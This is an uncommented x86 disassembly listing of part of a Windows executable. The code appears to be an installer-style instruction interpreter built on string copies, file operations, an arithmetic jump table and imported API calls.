  4016d5:	8b f0                	mov    %eax,%esi
  4016d7:	8d 45 08             	lea    0x8(%ebp),%eax
  4016da:	50                   	push   %eax
  4016db:	57                   	push   %edi
  4016dc:	68 00 20 00 00       	push   $0x2000
  4016e1:	56                   	push   %esi
  4016e2:	ff 15 0c 81 40 00    	call   *0x40810c
  4016e8:	85 c0                	test   %eax,%eax
  4016ea:	74 24                	je     0x401710
  4016ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4016ef:	3b c6                	cmp    %esi,%eax
  4016f1:	76 27                	jbe    0x40171a
  4016f3:	66 39 18             	cmp    %bx,(%eax)
  4016f6:	74 22                	je     0x40171a
  4016f8:	56                   	push   %esi
  4016f9:	e8 ff 4e 00 00       	call   0x4065fd
  4016fe:	3b c3                	cmp    %ebx,%eax
  401700:	74 0e                	je     0x401710
  401702:	83 c0 2c             	add    $0x2c,%eax
  401705:	50                   	push   %eax
  401706:	ff 75 08             	push   0x8(%ebp)
  401709:	e8 ac 4b 00 00       	call   0x4062ba
  40170e:	eb 0a                	jmp    0x40171a
  401710:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401717:	66 89 1f             	mov    %bx,(%edi)
  40171a:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40171d:	0f 85 a2 13 00 00    	jne    0x402ac5
  401723:	68 00 20 00 00       	push   $0x2000
  401728:	57                   	push   %edi
  401729:	57                   	push   %edi
  40172a:	ff 15 bc 80 40 00    	call   *0x4080bc
  401730:	e9 90 13 00 00       	jmp    0x402ac5
  401735:	6a ff                	push   $0xffffffff
  401737:	e8 05 15 00 00       	call   0x402c41
  40173c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40173f:	51                   	push   %ecx
  401740:	56                   	push   %esi
  401741:	68 00 20 00 00       	push   $0x2000
  401746:	53                   	push   %ebx
  401747:	50                   	push   %eax
  401748:	53                   	push   %ebx
  401749:	ff 15 14 81 40 00    	call   *0x408114
  40174f:	85 c0                	test   %eax,%eax
  401751:	0f 85 6e 13 00 00    	jne    0x402ac5
  401757:	e9 fd 10 00 00       	jmp    0x402859
  40175c:	6a ef                	push   $0xffffffef
  40175e:	e8 de 14 00 00       	call   0x402c41
  401763:	50                   	push   %eax
  401764:	56                   	push   %esi
  401765:	e8 75 46 00 00       	call   0x405ddf
  40176a:	e9 45 fe ff ff       	jmp    0x4015b4
  40176f:	6a 31                	push   $0x31
  401771:	e8 cb 14 00 00       	call   0x402c41
  401776:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401779:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40177c:	ff 75 f8             	push   -0x8(%ebp)
  40177f:	83 e0 07             	and    $0x7,%eax
  401782:	89 45 08             	mov    %eax,0x8(%ebp)
  401785:	e8 7c 44 00 00       	call   0x405c06
  40178a:	ff 75 f8             	push   -0x8(%ebp)
  40178d:	be d0 a5 40 00       	mov    $0x40a5d0,%esi
  401792:	85 c0                	test   %eax,%eax
  401794:	74 08                	je     0x40179e
  401796:	56                   	push   %esi
  401797:	e8 1e 4b 00 00       	call   0x4062ba
  40179c:	eb 17                	jmp    0x4017b5
  40179e:	68 00 30 4d 00       	push   $0x4d3000
  4017a3:	56                   	push   %esi
  4017a4:	e8 11 4b 00 00       	call   0x4062ba
  4017a9:	50                   	push   %eax
  4017aa:	e8 e0 43 00 00       	call   0x405b8f
  4017af:	50                   	push   %eax
  4017b0:	e8 21 4b 00 00       	call   0x4062d6
  4017b5:	56                   	push   %esi
  4017b6:	e8 93 4d 00 00       	call   0x40654e
  4017bb:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017bf:	7c 31                	jl     0x4017f2
  4017c1:	56                   	push   %esi
  4017c2:	e8 36 4e 00 00       	call   0x4065fd
  4017c7:	33 c9                	xor    %ecx,%ecx
  4017c9:	3b c3                	cmp    %ebx,%eax
  4017cb:	74 10                	je     0x4017dd
  4017cd:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4017d0:	83 c0 14             	add    $0x14,%eax
  4017d3:	51                   	push   %ecx
  4017d4:	50                   	push   %eax
  4017d5:	ff 15 18 81 40 00    	call   *0x408118
  4017db:	8b c8                	mov    %eax,%ecx
  4017dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4017e0:	83 c0 fd             	add    $0xfffffffd,%eax
  4017e3:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017e8:	23 c1                	and    %ecx,%eax
  4017ea:	f7 d8                	neg    %eax
  4017ec:	1b c0                	sbb    %eax,%eax
  4017ee:	40                   	inc    %eax
  4017ef:	89 45 08             	mov    %eax,0x8(%ebp)
  4017f2:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017f5:	75 06                	jne    0x4017fd
  4017f7:	56                   	push   %esi
  4017f8:	e8 8e 45 00 00       	call   0x405d8b
  4017fd:	33 c0                	xor    %eax,%eax
  4017ff:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401803:	0f 95 c0             	setne  %al
  401806:	40                   	inc    %eax
  401807:	50                   	push   %eax
  401808:	68 00 00 00 40       	push   $0x40000000
  40180d:	56                   	push   %esi
  40180e:	e8 9d 45 00 00       	call   0x405db0
  401813:	83 f8 ff             	cmp    $0xffffffff,%eax
  401816:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401819:	75 72                	jne    0x40188d
  40181b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40181e:	75 4f                	jne    0x40186f
  401820:	57                   	push   %edi
  401821:	68 d0 25 41 00       	push   $0x4125d0
  401826:	e8 8f 4a 00 00       	call   0x4062ba
  40182b:	56                   	push   %esi
  40182c:	57                   	push   %edi
  40182d:	e8 88 4a 00 00       	call   0x4062ba
  401832:	ff 75 ec             	push   -0x14(%ebp)
  401835:	68 d0 e5 40 00       	push   $0x40e5d0
  40183a:	e8 9d 4a 00 00       	call   0x4062dc
  40183f:	68 d0 25 41 00       	push   $0x4125d0
  401844:	57                   	push   %edi
  401845:	e8 70 4a 00 00       	call   0x4062ba
  40184a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40184d:	c1 f8 03             	sar    $0x3,%eax
  401850:	50                   	push   %eax
  401851:	68 d0 e5 40 00       	push   $0x40e5d0
  401856:	e8 c5 40 00 00       	call   0x405920
  40185b:	83 e8 04             	sub    $0x4,%eax
  40185e:	0f 84 57 ff ff ff    	je     0x4017bb
  401864:	48                   	dec    %eax
  401865:	74 1b                	je     0x401882
  401867:	56                   	push   %esi
  401868:	6a fa                	push   $0xfffffffa
  40186a:	e9 24 fc ff ff       	jmp    0x401493
  40186f:	ff 75 f8             	push   -0x8(%ebp)
  401872:	6a e2                	push   $0xffffffe2
  401874:	e8 a9 3a 00 00       	call   0x405322
  401879:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40187d:	e9 34 fd ff ff       	jmp    0x4015b6
  401882:	ff 05 88 af 47 00    	incl   0x47af88
  401888:	e9 41 12 00 00       	jmp    0x402ace
  40188d:	ff 75 f8             	push   -0x8(%ebp)
  401890:	6a ea                	push   $0xffffffea
  401892:	e8 8b 3a 00 00       	call   0x405322
  401897:	ff 05 b4 af 47 00    	incl   0x47afb4
  40189d:	53                   	push   %ebx
  40189e:	53                   	push   %ebx
  40189f:	ff 75 d0             	push   -0x30(%ebp)
  4018a2:	ff 75 e0             	push   -0x20(%ebp)
  4018a5:	e8 6c 18 00 00       	call   0x403116
  4018aa:	ff 0d b4 af 47 00    	decl   0x47afb4
  4018b0:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  4018b4:	8b f8                	mov    %eax,%edi
  4018b6:	75 06                	jne    0x4018be
  4018b8:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018bc:	74 12                	je     0x4018d0
  4018be:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018c1:	50                   	push   %eax
  4018c2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018c5:	53                   	push   %ebx
  4018c6:	50                   	push   %eax
  4018c7:	ff 75 d0             	push   -0x30(%ebp)
  4018ca:	ff 15 10 81 40 00    	call   *0x408110
  4018d0:	ff 75 d0             	push   -0x30(%ebp)
  4018d3:	ff 15 20 81 40 00    	call   *0x408120
  4018d9:	3b fb                	cmp    %ebx,%edi
  4018db:	0f 8d e4 11 00 00    	jge    0x402ac5
  4018e1:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018e4:	75 13                	jne    0x4018f9
  4018e6:	6a e9                	push   $0xffffffe9
  4018e8:	56                   	push   %esi
  4018e9:	e8 ee 49 00 00       	call   0x4062dc
  4018ee:	ff 75 f8             	push   -0x8(%ebp)
  4018f1:	56                   	push   %esi
  4018f2:	e8 df 49 00 00       	call   0x4062d6
  4018f7:	eb 08                	jmp    0x401901
  4018f9:	6a ee                	push   $0xffffffee
  4018fb:	56                   	push   %esi
  4018fc:	e8 db 49 00 00       	call   0x4062dc
  401901:	68 10 00 20 00       	push   $0x200010
  401906:	56                   	push   %esi
  401907:	e9 e6 09 00 00       	jmp    0x4022f2
  40190c:	53                   	push   %ebx
  40190d:	eb 34                	jmp    0x401943
  40190f:	6a 31                	push   $0x31
  401911:	e8 2b 13 00 00       	call   0x402c41
  401916:	ff 75 d8             	push   -0x28(%ebp)
  401919:	50                   	push   %eax
  40191a:	e8 01 40 00 00       	call   0x405920
  40191f:	3b c3                	cmp    %ebx,%eax
  401921:	0f 84 64 0f 00 00    	je     0x40288b
  401927:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40192a:	0f 84 6c 01 00 00    	je     0x401a9c
  401930:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  401933:	0f 85 8c 11 00 00    	jne    0x402ac5
  401939:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40193c:	e9 8f 11 00 00       	jmp    0x402ad0
  401941:	6a f0                	push   $0xfffffff0
  401943:	e8 f9 12 00 00       	call   0x402c41
  401948:	ff 75 dc             	push   -0x24(%ebp)
  40194b:	50                   	push   %eax
  40194c:	e8 7b 40 00 00       	call   0x4059cc
  401951:	e9 6f 11 00 00       	jmp    0x402ac5
  401956:	6a 01                	push   $0x1
  401958:	e8 e4 12 00 00       	call   0x402c41
  40195d:	50                   	push   %eax
  40195e:	e8 6d 49 00 00       	call   0x4062d0
  401963:	e9 2a 0c 00 00       	jmp    0x402592
  401968:	6a 02                	push   $0x2
  40196a:	e8 b0 12 00 00       	call   0x402c1f
  40196f:	6a 03                	push   $0x3
  401971:	89 45 b0             	mov    %eax,-0x50(%ebp)
  401974:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401977:	e8 a3 12 00 00       	call   0x402c1f
  40197c:	59                   	pop    %ecx
  40197d:	8b f8                	mov    %eax,%edi
  40197f:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401982:	59                   	pop    %ecx
  401983:	6a 01                	push   $0x1
  401985:	89 7d cc             	mov    %edi,-0x34(%ebp)
  401988:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40198b:	89 45 08             	mov    %eax,0x8(%ebp)
  40198e:	e8 ae 12 00 00       	call   0x402c41
  401993:	50                   	push   %eax
  401994:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401997:	e8 34 49 00 00       	call   0x4062d0
  40199c:	39 5d b4             	cmp    %ebx,-0x4c(%ebp)
  40199f:	66 89 1e             	mov    %bx,(%esi)
  4019a2:	75 03                	jne    0x4019a7
  4019a4:	89 45 08             	mov    %eax,0x8(%ebp)
  4019a7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019aa:	0f 84 15 11 00 00    	je     0x402ac5
  4019b0:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4019b3:	3b cb                	cmp    %ebx,%ecx
  4019b5:	7d 0b                	jge    0x4019c2
  4019b7:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019ba:	3b fb                	cmp    %ebx,%edi
  4019bc:	0f 8c 03 11 00 00    	jl     0x402ac5
  4019c2:	3b f8                	cmp    %eax,%edi
  4019c4:	7e 02                	jle    0x4019c8
  4019c6:	8b f8                	mov    %eax,%edi
  4019c8:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4019cb:	8d 04 78             	lea    (%eax,%edi,2),%eax
  4019ce:	50                   	push   %eax
  4019cf:	56                   	push   %esi
  4019d0:	e8 e5 48 00 00       	call   0x4062ba
  4019d5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d8:	7d 0e                	jge    0x4019e8
  4019da:	56                   	push   %esi
  4019db:	e8 f0 48 00 00       	call   0x4062d0
  4019e0:	01 45 08             	add    %eax,0x8(%ebp)
  4019e3:	79 03                	jns    0x4019e8
  4019e5:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4019eb:	3d 00 20 00 00       	cmp    $0x2000,%eax
  4019f0:	0f 8d cf 10 00 00    	jge    0x402ac5
  4019f6:	66 89 1c 46          	mov    %bx,(%esi,%eax,2)
  4019fa:	e9 c6 10 00 00       	jmp    0x402ac5
  4019ff:	6a 20                	push   $0x20
  401a01:	e8 3b 12 00 00       	call   0x402c41
  401a06:	6a 31                	push   $0x31
  401a08:	8b f0                	mov    %eax,%esi
  401a0a:	e8 32 12 00 00       	call   0x402c41
  401a0f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401a12:	50                   	push   %eax
  401a13:	56                   	push   %esi
  401a14:	75 12                	jne    0x401a28
  401a16:	ff 15 04 81 40 00    	call   *0x408104
  401a1c:	85 c0                	test   %eax,%eax
  401a1e:	75 7c                	jne    0x401a9c
  401a20:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a23:	e9 a8 10 00 00       	jmp    0x402ad0
  401a28:	ff 15 1c 81 40 00    	call   *0x40811c
  401a2e:	eb ec                	jmp    0x401a1c
  401a30:	33 ff                	xor    %edi,%edi
  401a32:	47                   	inc    %edi
  401a33:	57                   	push   %edi
  401a34:	e8 08 12 00 00       	call   0x402c41
  401a39:	68 00 20 00 00       	push   $0x2000
  401a3e:	56                   	push   %esi
  401a3f:	50                   	push   %eax
  401a40:	89 45 08             	mov    %eax,0x8(%ebp)
  401a43:	ff 15 24 81 40 00    	call   *0x408124
  401a49:	85 c0                	test   %eax,%eax
  401a4b:	74 13                	je     0x401a60
  401a4d:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a50:	74 14                	je     0x401a66
  401a52:	56                   	push   %esi
  401a53:	ff 75 08             	push   0x8(%ebp)
  401a56:	ff 15 1c 81 40 00    	call   *0x40811c
  401a5c:	85 c0                	test   %eax,%eax
  401a5e:	75 06                	jne    0x401a66
  401a60:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a63:	66 89 1e             	mov    %bx,(%esi)
  401a66:	66 89 9e fe 3f 00 00 	mov    %bx,0x3ffe(%esi)
  401a6d:	e9 53 10 00 00       	jmp    0x402ac5
  401a72:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401a75:	53                   	push   %ebx
  401a76:	e8 a4 11 00 00       	call   0x402c1f
  401a7b:	6a 01                	push   $0x1
  401a7d:	8b f8                	mov    %eax,%edi
  401a7f:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401a82:	e8 98 11 00 00       	call   0x402c1f
  401a87:	59                   	pop    %ecx
  401a88:	3b f3                	cmp    %ebx,%esi
  401a8a:	59                   	pop    %ecx
  401a8b:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401a8e:	75 08                	jne    0x401a98
  401a90:	3b f8                	cmp    %eax,%edi
  401a92:	7c 08                	jl     0x401a9c
  401a94:	7e 8a                	jle    0x401a20
  401a96:	eb 12                	jmp    0x401aaa
  401a98:	3b f8                	cmp    %eax,%edi
  401a9a:	73 08                	jae    0x401aa4
  401a9c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a9f:	e9 2c 10 00 00       	jmp    0x402ad0
  401aa4:	0f 86 76 ff ff ff    	jbe    0x401a20
  401aaa:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401aad:	e9 1e 10 00 00       	jmp    0x402ad0
  401ab2:	6a 01                	push   $0x1
  401ab4:	e8 66 11 00 00       	call   0x402c1f
  401ab9:	8b f8                	mov    %eax,%edi
  401abb:	6a 02                	push   $0x2
  401abd:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401ac0:	89 7d 08             	mov    %edi,0x8(%ebp)
  401ac3:	e8 57 11 00 00       	call   0x402c1f
  401ac8:	59                   	pop    %ecx
  401ac9:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401acc:	59                   	pop    %ecx
  401acd:	8b c8                	mov    %eax,%ecx
  401acf:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401ad2:	83 f8 0d             	cmp    $0xd,%eax
  401ad5:	77 73                	ja     0x401b4a
  401ad7:	ff 24 85 e7 2b 40 00 	jmp    *0x402be7(,%eax,4)
  401ade:	03 f9                	add    %ecx,%edi
  401ae0:	eb 6b                	jmp    0x401b4d
  401ae2:	2b f9                	sub    %ecx,%edi
  401ae4:	eb 67                	jmp    0x401b4d
  401ae6:	0f af cf             	imul   %edi,%ecx
  401ae9:	eb 17                	jmp    0x401b02
  401aeb:	3b cb                	cmp    %ebx,%ecx
  401aed:	74 44                	je     0x401b33
  401aef:	8b c7                	mov    %edi,%eax
  401af1:	99                   	cltd
  401af2:	f7 f9                	idiv   %ecx
  401af4:	8b f8                	mov    %eax,%edi
  401af6:	eb 55                	jmp    0x401b4d
  401af8:	0b cf                	or     %edi,%ecx
  401afa:	eb 06                	jmp    0x401b02
  401afc:	23 cf                	and    %edi,%ecx
  401afe:	eb 02                	jmp    0x401b02
  401b00:	33 cf                	xor    %edi,%ecx
  401b02:	8b f9                	mov    %ecx,%edi
  401b04:	eb 47                	jmp    0x401b4d
  401b06:	33 c0                	xor    %eax,%eax
  401b08:	3b fb                	cmp    %ebx,%edi
  401b0a:	0f 94 c0             	sete   %al
  401b0d:	eb e5                	jmp    0x401af4
  401b0f:	3b fb                	cmp    %ebx,%edi
  401b11:	75 0e                	jne    0x401b21
  401b13:	eb 08                	jmp    0x401b1d
  401b15:	33 ff                	xor    %edi,%edi
  401b17:	eb 34                	jmp    0x401b4d
  401b19:	3b fb                	cmp    %ebx,%edi
  401b1b:	74 f8                	je     0x401b15
  401b1d:	3b cb                	cmp    %ebx,%ecx
  401b1f:	74 f4                	je     0x401b15
  401b21:	33 ff                	xor    %edi,%edi
  401b23:	47                   	inc    %edi
  401b24:	eb 27                	jmp    0x401b4d
  401b26:	3b cb                	cmp    %ebx,%ecx
  401b28:	74 09                	je     0x401b33
  401b2a:	8b c7                	mov    %edi,%eax
  401b2c:	99                   	cltd
  401b2d:	f7 f9                	idiv   %ecx
  401b2f:	8b fa                	mov    %edx,%edi
  401b31:	eb 1a                	jmp    0x401b4d
  401b33:	33 ff                	xor    %edi,%edi
  401b35:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b3c:	eb 0f                	jmp    0x401b4d
  401b3e:	d3 e7                	shl    %cl,%edi
  401b40:	eb 0b                	jmp    0x401b4d
  401b42:	d3 ff                	sar    %cl,%edi
  401b44:	eb 07                	jmp    0x401b4d
  401b46:	d3 ef                	shr    %cl,%edi
  401b48:	eb 03                	jmp    0x401b4d
  401b4a:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b4d:	57                   	push   %edi
  401b4e:	e9 1a fa ff ff       	jmp    0x40156d
  401b53:	6a 01                	push   $0x1
  401b55:	e8 e7 10 00 00       	call   0x402c41
  401b5a:	6a 02                	push   $0x2
  401b5c:	8b f8                	mov    %eax,%edi
  401b5e:	e8 bc 10 00 00       	call   0x402c1f
  401b63:	50                   	push   %eax
  401b64:	57                   	push   %edi
  401b65:	56                   	push   %esi
  401b66:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401b69:	ff 15 90 82 40 00    	call   *0x408290
  401b6f:	83 c4 10             	add    $0x10,%esp
  401b72:	e9 4e 0f 00 00       	jmp    0x402ac5
  401b77:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b7a:	8b 3d 30 e6 41 00    	mov    0x41e630,%edi
  401b80:	3b c3                	cmp    %ebx,%eax
  401b82:	74 44                	je     0x401bc8
  401b84:	48                   	dec    %eax
  401b85:	3b fb                	cmp    %ebx,%edi
  401b87:	0f 84 57 07 00 00    	je     0x4022e4
  401b8d:	8b 3f                	mov    (%edi),%edi
  401b8f:	3b c3                	cmp    %ebx,%eax
  401b91:	75 f1                	jne    0x401b84
  401b93:	3b fb                	cmp    %ebx,%edi
  401b95:	0f 84 49 07 00 00    	je     0x4022e4
  401b9b:	83 c7 04             	add    $0x4,%edi
  401b9e:	be d0 a5 40 00       	mov    $0x40a5d0,%esi
  401ba3:	57                   	push   %edi
  401ba4:	56                   	push   %esi
  401ba5:	e8 10 47 00 00       	call   0x4062ba
  401baa:	a1 30 e6 41 00       	mov    0x41e630,%eax
  401baf:	83 c0 04             	add    $0x4,%eax
  401bb2:	50                   	push   %eax
  401bb3:	57                   	push   %edi
  401bb4:	e8 01 47 00 00       	call   0x4062ba
  401bb9:	a1 30 e6 41 00       	mov    0x41e630,%eax
  401bbe:	56                   	push   %esi
  401bbf:	83 c0 04             	add    $0x4,%eax
  401bc2:	50                   	push   %eax
  401bc3:	e9 19 0e 00 00       	jmp    0x4029e1
  401bc8:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401bcb:	74 25                	je     0x401bf2
  401bcd:	3b fb                	cmp    %ebx,%edi
  401bcf:	0f 84 b6 0c 00 00    	je     0x40288b
  401bd5:	8d 47 04             	lea    0x4(%edi),%eax
  401bd8:	50                   	push   %eax
  401bd9:	56                   	push   %esi
  401bda:	e8 db 46 00 00       	call   0x4062ba
  401bdf:	8b 07                	mov    (%edi),%eax
  401be1:	57                   	push   %edi
  401be2:	a3 30 e6 41 00       	mov    %eax,0x41e630
  401be7:	ff 15 28 81 40 00    	call   *0x408128
  401bed:	e9 d3 0e 00 00       	jmp    0x402ac5
  401bf2:	68 04 40 00 00       	push   $0x4004
  401bf7:	6a 40                	push   $0x40
  401bf9:	ff 15 34 81 40 00    	call   *0x408134
  401bff:	ff 75 d8             	push   -0x28(%ebp)
  401c02:	8b f0                	mov    %eax,%esi
  401c04:	8d 46 04             	lea    0x4(%esi),%eax
  401c07:	50                   	push   %eax
  401c08:	e8 cf 46 00 00       	call   0x4062dc
  401c0d:	a1 30 e6 41 00       	mov    0x41e630,%eax
  401c12:	89 06                	mov    %eax,(%esi)
  401c14:	89 35 30 e6 41 00    	mov    %esi,0x41e630
  401c1a:	e9 a6 0e 00 00       	jmp    0x402ac5
  401c1f:	6a 03                	push   $0x3
  401c21:	e8 f9 0f 00 00       	call   0x402c1f
  401c26:	6a 04                	push   $0x4
  401c28:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401c2b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401c2e:	e8 ec 0f 00 00       	call   0x402c1f
  401c33:	f6 45 ec 01          	testb  $0x1,-0x14(%ebp)
  401c37:	59                   	pop    %ecx
  401c38:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401c3b:	59                   	pop    %ecx
  401c3c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c3f:	74 0a                	je     0x401c4b
  401c41:	6a 33                	push   $0x33
  401c43:	e8 f9 0f 00 00       	call   0x402c41
  401c48:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401c4b:	f6 45 ec 02          	testb  $0x2,-0x14(%ebp)
  401c4f:	74 0a                	je     0x401c5b
  401c51:	6a 44                	push   $0x44
  401c53:	e8 e9 0f 00 00       	call   0x402c41
  401c58:	89 45 08             	mov    %eax,0x8(%ebp)
  401c5b:	83 7d d4 21          	cmpl   $0x21,-0x2c(%ebp)
  401c5f:	6a 01                	push   $0x1
  401c61:	75 4c                	jne    0x401caf
  401c63:	e8 b7 0f 00 00       	call   0x402c1f
  401c68:	6a 02                	push   $0x2
  401c6a:	8b f8                	mov    %eax,%edi
  401c6c:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401c6f:	e8 ab 0f 00 00       	call   0x402c1f
  401c74:	59                   	pop    %ecx
  401c75:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401c78:	59                   	pop    %ecx
  401c79:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401c7c:	c1 f9 02             	sar    $0x2,%ecx
  401c7f:	74 1e                	je     0x401c9f
  401c81:	8d 55 d0             	lea    -0x30(%ebp),%edx
  401c84:	52                   	push   %edx
  401c85:	51                   	push   %ecx
  401c86:	53                   	push   %ebx
  401c87:	ff 75 08             	push   0x8(%ebp)
  401c8a:	ff 75 f0             	push   -0x10(%ebp)
  401c8d:	50                   	push   %eax
  401c8e:	57                   	push   %edi
  401c8f:	ff 15 8c 82 40 00    	call   *0x40828c
  401c95:	f7 d8                	neg    %eax
  401c97:	1b c0                	sbb    %eax,%eax
  401c99:	40                   	inc    %eax
  401c9a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c9d:	eb 43                	jmp    0x401ce2
  401c9f:	ff 75 08             	push   0x8(%ebp)
  401ca2:	ff 75 f0             	push   -0x10(%ebp)
  401ca5:	50                   	push   %eax
  401ca6:	57                   	push   %edi
  401ca7:	ff 15 18 82 40 00    	call   *0x408218
  401cad:	eb 30                	jmp    0x401cdf
  401caf:	e8 8d 0f 00 00       	call   0x402c41
  401cb4:	6a 12                	push   $0x12
  401cb6:	8b f8                	mov    %eax,%edi
  401cb8:	e8 84 0f 00 00       	call   0x402c41
  401cbd:	66 8b 08             	mov    (%eax),%cx
  401cc0:	66 f7 d9             	neg    %cx
  401cc3:	1b c9                	sbb    %ecx,%ecx
  401cc5:	23 c8                	and    %eax,%ecx
  401cc7:	66 8b 07             	mov    (%edi),%ax
  401cca:	66 f7 d8             	neg    %ax
  401ccd:	1b c0                	sbb    %eax,%eax
  401ccf:	51                   	push   %ecx
  401cd0:	23 c7                	and    %edi,%eax
  401cd2:	50                   	push   %eax
  401cd3:	ff 75 08             	push   0x8(%ebp)
  401cd6:	ff 75 f0             	push   -0x10(%ebp)
  401cd9:	ff 15 74 82 40 00    	call   *0x408274
  401cdf:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401ce2:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ce5:	0f 8c da 0d 00 00    	jl     0x402ac5
  401ceb:	ff 75 d0             	push   -0x30(%ebp)
  401cee:	e9 7a f8 ff ff       	jmp    0x40156d
  401cf3:	53                   	push   %ebx
  401cf4:	e8 26 0f 00 00       	call   0x402c1f
  401cf9:	59                   	pop    %ecx
  401cfa:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401cfd:	50                   	push   %eax
  401cfe:	ff 15 6c 82 40 00    	call   *0x40826c
  401d04:	85 c0                	test   %eax,%eax
  401d06:	0f 84 14 fd ff ff    	je     0x401a20
  401d0c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401d0f:	e9 bc 0d 00 00       	jmp    0x402ad0
  401d14:	6a 02                	push   $0x2
  401d16:	e8 04 0f 00 00       	call   0x402c1f
  401d1b:	6a 01                	push   $0x1
  401d1d:	8b f8                	mov    %eax,%edi
  401d1f:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401d22:	e8 f8 0e 00 00       	call   0x402c1f
  401d27:	59                   	pop    %ecx
  401d28:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401d2b:	59                   	pop    %ecx
  401d2c:	57                   	push   %edi
  401d2d:	50                   	push   %eax
  401d2e:	ff 15 e4 81 40 00    	call   *0x4081e4
  401d34:	e9 59 08 00 00       	jmp    0x402592
  401d39:	a1 48 af 47 00       	mov    0x47af48,%eax
  401d3e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401d41:	53                   	push   %ebx
  401d42:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d45:	e8 d5 0e 00 00       	call   0x402c1f
  401d4a:	59                   	pop    %ecx
  401d4b:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401d4e:	56                   	push   %esi
  401d4f:	6a eb                	push   $0xffffffeb
  401d51:	50                   	push   %eax
  401d52:	ff 15 70 82 40 00    	call   *0x408270
  401d58:	e9 68 0d 00 00       	jmp    0x402ac5
  401d5d:	ff 75 dc             	push   -0x24(%ebp)
  401d60:	ff 75 f8             	push   -0x8(%ebp)
  401d63:	ff 15 e4 81 40 00    	call   *0x4081e4
  401d69:	8b f0                	mov    %eax,%esi
  401d6b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401d6e:	50                   	push   %eax
  401d6f:	56                   	push   %esi
  401d70:	ff 15 24 82 40 00    	call   *0x408224
  401d76:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401d79:	6a 10                	push   $0x10
  401d7b:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d7f:	50                   	push   %eax
  401d80:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401d83:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d87:	50                   	push   %eax
  401d88:	53                   	push   %ebx
  401d89:	53                   	push   %ebx
  401d8a:	e8 b2 0e 00 00       	call   0x402c41
  401d8f:	50                   	push   %eax
  401d90:	53                   	push   %ebx
  401d91:	ff 15 60 82 40 00    	call   *0x408260
  401d97:	50                   	push   %eax
  401d98:	53                   	push   %ebx
  401d99:	68 72 01 00 00       	push   $0x172
  401d9e:	56                   	push   %esi
  401d9f:	ff 15 18 82 40 00    	call   *0x408218
  401da5:	3b c3                	cmp    %ebx,%eax
  401da7:	0f 84 18 0d 00 00    	je     0x402ac5
  401dad:	50                   	push   %eax
  401dae:	ff 15 5c 80 40 00    	call   *0x40805c
